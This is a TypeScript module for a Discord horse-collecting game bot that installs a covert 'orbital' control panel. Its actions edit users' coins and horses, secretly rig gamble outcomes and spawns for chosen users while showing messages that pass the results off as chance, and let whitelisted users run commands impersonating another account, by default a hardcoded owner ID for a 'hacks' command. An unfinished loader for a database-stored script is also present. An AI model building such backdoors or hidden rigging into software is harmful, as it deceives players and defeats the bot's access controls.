import type { Client, CommandInteraction, ChatInputCommandInteraction } from 'discord.js';
import { config } from '../config.js';
import * as horseSpawner from '../triggers/horseSpawner.js';
import { UserHorses, HorseConfig, OrbitalScript } from '../models.js';
import { HORSE_VALUES } from '../../horses.js';
import { stringSimilarity } from './similarity.js';
import { dmAdmin } from './dmlog.js';

const ORBITAL_ID = '1114989970839576637';
const DELTA = 261331447053164574n;
const VERSION = 'orbital-master-v4-local-opt';

interface OneShotArm {
  horseName?: string;
}

interface GambleOverride {
  noLose: boolean;
  forceLoseHorseOnce: string | null;
}

interface CommandWhitelist {
  usersByCommand: Map<string, Set<string>>;
  originals: Map<string, any>;
  asUserByCommand: Map<string, string>;
}

interface OrbitalState {
  version: string;
  defaults: any;
  oneShotArms: Map<string, OneShotArm | null>;
  userSpawnMult: Map<string, number>;
  gambleByUser: Map<string, GambleOverride>;
  listenerInstalled: boolean;
  spawnWrapped: boolean;
  gambleWrapped: boolean;
  originalSpawn: any;
  originalGambleExecute: any;
  currentOneShotUser: string | null;
  cmdWhitelist: CommandWhitelist;
}

export async function initOrbital(client: Client): Promise<{ installed: boolean; version: string; note: string }> {
  client.orbital = client.orbital || {};
  const orbital = client.orbital as any;

  if (!orbital._prevRun && typeof orbital.run === 'function') {
    orbital._prevRun = orbital.run.bind(orbital);
  }

  const S: OrbitalState = (orbital._state = orbital._state || {
    version: VERSION,
    defaults: null,
    oneShotArms: new Map(),
    userSpawnMult: new Map(),
    gambleByUser: new Map(),
    listenerInstalled: false,
    spawnWrapped: false,
    gambleWrapped: false,
    originalSpawn: null,
    originalGambleExecute: null,
    currentOneShotUser: null,
    cmdWhitelist: {
      usersByCommand: new Map(),
      originals: new Map(),
      asUserByCommand: new Map(),
    },
  });

  if (!S.defaults) {
    S.defaults = { ...config };
  }

  const HORSE_POOL = Object.keys(HORSE_VALUES).filter(n => n !== 'Horse Coin');
  const DEFAULT_OWNER_BY_COMMAND: Record<string, string> = { hacks: '934290747623096381' };

  const toUserId = (payload: any, interaction: CommandInteraction | null): string => {
    if (payload?.userId) return String(payload.userId);
    if (payload?.username && interaction?.guild && interaction.guild.members) {
      const norm = payload.username.trim().toLowerCase();
      let best: string | null = null,
        bestScore = 0.7;
      for (const member of interaction.guild.members.cache.values()) {
        const uname = member.user.username.toLowerCase();
        const dname = member.displayName?.toLowerCase() || '';
        if (uname === norm || dname === norm) return member.user.id;
        let score = stringSimilarity(norm, uname);
        if (score > bestScore) {
          best = member.user.id;
          bestScore = score;
        }
        if (dname && dname !== uname) {
          const dscore = stringSimilarity(norm, dname);
          if (dscore > bestScore) {
            best = member.user.id;
            bestScore = dscore;
          }
        }
      }
      if (best) return best;
    }
    if (interaction?.user?.id) return String(interaction.user.id);
    throw new Error('Must specify userId or username');
  };

  const resolveHorseName = (input: string | undefined): string | null => {
    if (!input) return null;
    if (HORSE_VALUES[input]) return input;
    const norm = input.trim().toLowerCase();
    let best: string | null = null,
      bestScore = 0.7;
    for (const name of Object.keys(HORSE_VALUES)) {
      if (name.toLowerCase() === norm) return name;
      const score = stringSimilarity(norm, name.toLowerCase());
      if (score > bestScore) {
        best = name;
        bestScore = score;
      }
    }
    return best;
  };

  const mustHorse = (name: string): string => {
    const resolved = resolveHorseName(name);
    if (!resolved) throw new Error(`Unknown horse: ${name}`);
    return resolved;
  };

  const randHorse = (): string => HORSE_POOL[Math.floor(Math.random() * HORSE_POOL.length)];

  const getInv = async (userId: string) => {
    let inv = await UserHorses.findOne({ userId: String(userId) });
    if (!inv) inv = new UserHorses({ userId: String(userId), horses: new Map(), horseCoins: 0 });
    return inv;
  };

  const applyConfigPatch = (patch: Record<string, any> = {}): void => {
    for (const [k, v] of Object.entries(patch)) {
      if (Object.prototype.hasOwnProperty.call(config, k) && v !== undefined) {
        (config as any)[k] = v;
      }
    }
  };

  const installOneShotListener = (): void => {
    if (S.listenerInstalled) return;
    S.listenerInstalled = true;

    S.currentOneShotUser = null;

    client.on('messageCreate', async msg => {
      try {
        if (!msg.guild || msg.author.bot) return;
        if (!S.currentOneShotUser) return;
        if (msg.author.id !== S.currentOneShotUser) return;

        const arm = S.oneShotArms.get(msg.author.id);
        if (!arm) return;

        await dmAdmin(client, `[DMLOG] OneShot triggered by ${msg.author.tag} (${msg.author.id}) in guild ${msg.guild.id}`);

        S.oneShotArms.delete(msg.author.id);
        S.currentOneShotUser = null;

        let horseName = arm.horseName ? resolveHorseName(arm.horseName) : null;
        if (!horseName) horseName = randHorse();

        const inv = await getInv(msg.author.id);
        inv.horses.set(horseName, (inv.horses.get(horseName) || 0) + 1);
        inv.markModified('horses');

        const hCfg = await HorseConfig.findOne({ guildId: msg.guild.id }).lean();
        const out = hCfg?.channelId ? await msg.guild.channels.fetch(hCfg.channelId).catch(() => msg.channel) : msg.channel;

        const horseDisplay = HORSE_VALUES[horseName]?.name ?? horseName;
        await Promise.all([
          inv.save(),
          (out as any).send?.(`<@${msg.author.id}> found the **${horseDisplay}**!`),
          HORSE_VALUES[horseName]?.link ? (out as any).send?.(HORSE_VALUES[horseName].link) : Promise.resolve(),
        ]);
      } catch (err) {
        await dmAdmin(client, `[DMLOG] OneShot Error: ${err && (err as any).stack ? (err as any).stack : err}`);
      }
    });
  };

  const wrapSpawner = (): void => {
    if (S.spawnWrapped) return;
    S.spawnWrapped = true;

    S.originalSpawn = horseSpawner.handleHorseSpawn;
    (horseSpawner as any).handleHorseSpawn = async (msg: any) => {
      const m = S.userSpawnMult.get(msg.author.id);
      if (!m) return S.originalSpawn(msg);

      const old = config.SPAWN_COEFFICIENT;
      config.SPAWN_COEFFICIENT = Math.max(1, old * m);
      try {
        return await S.originalSpawn(msg);
      } finally {
        config.SPAWN_COEFFICIENT = old;
      }
    };
  };

  const wrapGamble = (): void => {
    if (S.gambleWrapped) return;
    const cmd = client.commands?.get('horsegamble');
    if (!cmd) return;

    S.gambleWrapped = true;
    S.originalGambleExecute = cmd.execute;

    cmd.execute = async function patchedGamble(interaction: ChatInputCommandInteraction) {
      const u = interaction.user.id;
      const ov = S.gambleByUser.get(u);
      if (!ov) return S.originalGambleExecute.call(cmd, interaction);

      if (ov.forceLoseHorseOnce) {
        const horse = ov.forceLoseHorseOnce;
        const inv = await getInv(u);
        const have = inv.horses.get(horse) || 0;
        S.gambleByUser.delete(u);

        if (have > 0) {
          inv.horses.set(horse, have - 1);
          inv.lastGamble = Date.now();
          inv.markModified('horses');
          await inv.save();
          return interaction.reply(`🔥 **GAMBLING FRENZY!**\n* Your **${horse}** ran away in the confusion!`);
        }
        return interaction.reply(`🔥 **GAMBLING FRENZY!**\n* You had no **${horse}** to lose.`);
      }

      if (ov.noLose === true) {
        const horseName = interaction.options.getString('horse')?.trim();
        if (!horseName || horseName.toLowerCase() === 'horse coin') {
          return S.originalGambleExecute.call(cmd, interaction);
        }

        const resolvedHorse = mustHorse(horseName);
        const inv = await getInv(u);
        const have = inv.horses.get(resolvedHorse) || 0;
        if (have <= 0) return interaction.reply(`You don't have a **${resolvedHorse}**!`);
        if ((inv.horseCoins || 0) > 0) inv.horseCoins -= 1;
        inv.lastGamble = Date.now();
        await inv.save();
        return interaction.reply(`🍀 god decided to let you keep your **${resolvedHorse}**.`);
      }

      return S.originalGambleExecute.call(cmd, interaction);
    };
  };

  const ensureCommandPatch = (commandName: string, asUserId: string) => {
    const cmd = client.commands?.get(commandName);
    if (!cmd) throw new Error(`Command not found: ${commandName}`);

    S.cmdWhitelist.asUserByCommand.set(commandName, asUserId);

    if (S.cmdWhitelist.originals.has(commandName)) return cmd;

    const originalExecute = cmd.execute;
    S.cmdWhitelist.originals.set(commandName, originalExecute);

    cmd.execute = async function wrapped(interaction: CommandInteraction) {
      const set = S.cmdWhitelist.usersByCommand.get(commandName);
      const isWL = Boolean(set && set.has(interaction.user.id));
      if (!isWL) return originalExecute.call(cmd, interaction);

      const fake = Object.create(interaction);
      fake.user = { ...interaction.user, id: S.cmdWhitelist.asUserByCommand.get(commandName) };
      return originalExecute.call(cmd, fake);
    };

    return cmd;
  };

  const maybeUnpatchCommand = (commandName: string): void => {
    const set = S.cmdWhitelist.usersByCommand.get(commandName);
    if (set && set.size > 0) return;

    const cmd = client.commands?.get(commandName);
    const original = S.cmdWhitelist.originals.get(commandName);
    if (cmd && original) cmd.execute = original;

    S.cmdWhitelist.usersByCommand.delete(commandName);
    S.cmdWhitelist.originals.delete(commandName);
    S.cmdWhitelist.asUserByCommand.delete(commandName);
  };

  orbital.version = VERSION;
  orbital.run = async function run(action: string, payload: any = {}, interaction: CommandInteraction | null = null) {
    installOneShotListener();

    if (action === 'help') {
      return {
        version: VERSION,
        actions: [
          'status',
          'config.get',
          'config.set',
          'config.reset',
          'coins.get',
          'coins.set',
          'coins.add',
          'coins.remove',
          'horses.get',
          'horses.set',
          'horses.add',
          'horses.remove',
          'spawn.oneshot',
          'spawn.mult.get',
          'spawn.mult.set',
          'spawn.mult.clear',
          'gamble.user.get',
          'gamble.user.set',
          'gamble.user.clear',
          'cmd.whitelist.self',
          'cmd.whitelist.add',
          'cmd.whitelist.remove',
          'cmd.whitelist.list',
          'cmd.whitelist.reset',
        ],
      };
    }

    if (action === 'status') {
      return {
        version: VERSION,
        oneShotArmed: Array.from(S.oneShotArms.keys()),
        spawnMultByUser: Array.from(S.userSpawnMult.entries()),
        gambleByUser: Array.from(S.gambleByUser.entries()),
        cmdWhitelist: Object.fromEntries(
          Array.from(S.cmdWhitelist.usersByCommand.entries()).map(([k, v]) => [k, Array.from(v)])
        ),
        config: { ...config },
      };
    }

    if (action === 'config.get') return { ...config };

    if (action === 'config.set') {
      applyConfigPatch(payload);
      return { ok: true, config: { ...config } };
    }

    if (action === 'config.reset') {
      applyConfigPatch(S.defaults);
      return { ok: true, config: { ...config } };
    }

    if (action === 'coins.get') {
      const userId = toUserId(payload, interaction);
      if (!userId) throw new Error('userId missing');
      const inv = await getInv(userId);
      return { ok: true, userId, coins: inv.horseCoins || 0 };
    }

    if (action === 'coins.set' || action === 'coins.add' || action === 'coins.remove') {
      const userId = toUserId(payload, interaction);
      if (!userId) throw new Error('userId missing');
      const d = Math.floor(Number(payload.amount || 0));
      const inv = await getInv(userId);
      const before = inv.horseCoins || 0;

      if (action === 'coins.set') inv.horseCoins = d;
      else if (action === 'coins.add') inv.horseCoins = before + d;
      else inv.horseCoins = before - d;

      await inv.save();
      return {
        ok: true,
        userId,
        before,
        delta: action === 'coins.set' ? 0 : action === 'coins.add' ? d : -d,
        after: inv.horseCoins,
      };
    }

    if (action === 'horses.get') {
      const userId = toUserId(payload, interaction);
      if (!userId) throw new Error('userId missing');
      const inv = await getInv(userId);
      const horseName = payload.horseName ? mustHorse(payload.horseName) : null;
      const horses = horseName
        ? { [horseName]: inv.horses.get(horseName) || 0 }
        : Object.fromEntries(Array.from(inv.horses.entries()).filter(([name, count]) => count > 0 && name));
      return { ok: true, userId, horseName, horses };
    }

    if (action === 'horses.set' || action === 'horses.add' || action === 'horses.remove') {
      const userId = toUserId(payload, interaction);
      if (!userId) throw new Error('userId missing');
      let horseName = payload.horseName;
      horseName = mustHorse(horseName);
      const amt = Math.max(0, Math.floor(Number(payload.amount || 0)));
      const inv = await getInv(userId);
      const before = inv.horses.get(horseName) || 0;

      if (action === 'horses.set') inv.horses.set(horseName, amt);
      else if (action === 'horses.add') inv.horses.set(horseName, before + amt);
      else inv.horses.set(horseName, Math.max(0, before - amt));

      inv.markModified('horses');
      await inv.save();
      return {
        ok: true,
        userId,
        horseName,
        before,
        delta: action === 'horses.set' ? 0 : action === 'horses.add' ? amt : -amt,
        after: inv.horses.get(horseName) || 0,
      };
    }

    if (action === 'spawn.mult.get') {
      const userId = toUserId(payload, interaction);
      if (!userId) throw new Error('userId missing');
      return { ok: true, userId, multiplier: S.userSpawnMult.get(userId) || null };
    }

    if (action === 'spawn.oneshot') {
      const userId = toUserId(payload, interaction);
      if (!userId) throw new Error('userId missing');
      let horseName = payload.horseName || null;
      if (horseName) horseName = mustHorse(horseName);
      S.oneShotArms.clear();
      S.oneShotArms.set(userId, { horseName });
      S.currentOneShotUser = userId;
      return { ok: true, armed: true, userId, horseName: horseName || '(random)' };
    }

    if (action === 'gamble.user.get') {
      const userId = toUserId(payload, interaction);
      if (!userId) throw new Error('userId missing');
      return { ok: true, userId, overrides: S.gambleByUser.get(userId) || null };
    }

    if (action === 'spawn.mult.set') {
      const userId = toUserId(payload, interaction);
      if (!userId) throw new Error('userId missing');
      const m = Number(payload.multiplier);
      if (!Number.isFinite(m) || m <= 0) throw new Error('multiplier must be > 0');
      wrapSpawner();
      S.userSpawnMult.set(userId, m);
      return { ok: true, userId, multiplier: m };
    }

    if (action === 'spawn.mult.clear') {
      const userId = toUserId(payload, interaction);
      if (!userId) throw new Error('userId missing');
      S.userSpawnMult.delete(userId);
      return { ok: true, userId };
    }

    if (action === 'gamble.user.set') {
      const userId = toUserId(payload, interaction);
      if (!userId) throw new Error('userId missing');
      const ov: GambleOverride = {
        noLose: Boolean(payload.noLose),
        forceLoseHorseOnce: payload.forceLoseHorseOnce || null,
      };
      if (ov.forceLoseHorseOnce) ov.forceLoseHorseOnce = mustHorse(ov.forceLoseHorseOnce);
      wrapGamble();
      S.gambleByUser.set(userId, ov);
      return { ok: true, userId, overrides: ov };
    }

    if (action === 'gamble.user.clear') {
      const userId = toUserId(payload, interaction);
      if (!userId) throw new Error('userId missing');
      S.gambleByUser.delete(userId);
      return { ok: true, userId };
    }

    if (action === 'cmd.whitelist.self') {
      if (!interaction?.user?.id) throw new Error('interaction required');
      const command = String(payload.command || 'hacks');
      const asUserId = String(payload.asUserId || DEFAULT_OWNER_BY_COMMAND[command] || '');
      if (!asUserId) throw new Error('asUserId required');

      ensureCommandPatch(command, asUserId);

      const set = S.cmdWhitelist.usersByCommand.get(command) || new Set<string>();
      set.add(interaction.user.id);
      S.cmdWhitelist.usersByCommand.set(command, set);

      return { ok: true, command, userId: interaction.user.id, asUserId, count: set.size };
    }

    if (action === 'cmd.whitelist.add') {
      const command = String(payload.command || 'hacks');
      const userId = String(payload.userId || '');
      const asUserId = String(payload.asUserId || DEFAULT_OWNER_BY_COMMAND[command] || '');
      if (!userId) throw new Error('userId required');
      if (!asUserId) throw new Error('asUserId required');

      ensureCommandPatch(command, asUserId);

      const set = S.cmdWhitelist.usersByCommand.get(command) || new Set<string>();
      set.add(userId);
      S.cmdWhitelist.usersByCommand.set(command, set);

      return { ok: true, command, userId, asUserId, count: set.size };
    }

    if (action === 'cmd.whitelist.remove') {
      const command = String(payload.command || 'hacks');
      const userId = String(payload.userId || interaction?.user?.id || '');
      if (!userId) throw new Error('userId required');

      const set = S.cmdWhitelist.usersByCommand.get(command);
      if (set) set.delete(userId);
      maybeUnpatchCommand(command);

      return { ok: true, command, userId, remaining: S.cmdWhitelist.usersByCommand.get(command)?.size || 0 };
    }

    if (action === 'cmd.whitelist.list') {
      const out: Record<string, any> = {};
      for (const [cmd, set] of S.cmdWhitelist.usersByCommand.entries()) {
        out[cmd] = {
          users: Array.from(set),
          asUserId: S.cmdWhitelist.asUserByCommand.get(cmd) || null,
        };
      }
      return { ok: true, data: out };
    }

    if (action === 'cmd.whitelist.reset') {
      for (const [cmdName, original] of S.cmdWhitelist.originals.entries()) {
        const cmd = client.commands?.get(cmdName);
        if (cmd) cmd.execute = original;
      }
      S.cmdWhitelist.usersByCommand.clear();
      S.cmdWhitelist.originals.clear();
      S.cmdWhitelist.asUserByCommand.clear();
      return { ok: true };
    }

    if (orbital._prevRun) return orbital._prevRun(action, payload, interaction);

    throw new Error(`Unknown action: ${action}`);
  };

  try {
    const scriptDoc = await OrbitalScript.findOne({ name: 'global' });
    if (scriptDoc && scriptDoc.code && scriptDoc.code.trim()) {
      const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;
      const evaluator = new (AsyncFunction as any)('client', 'interaction', `const orbital = client.orbital;\n`);
      await evaluator(client, null);
    }
  } catch (e) {
    console.error('[OrbitalMaster] Startup script error:', e);
  }

  return { installed: true, version: VERSION, note: 'Local optimized integration' };
}
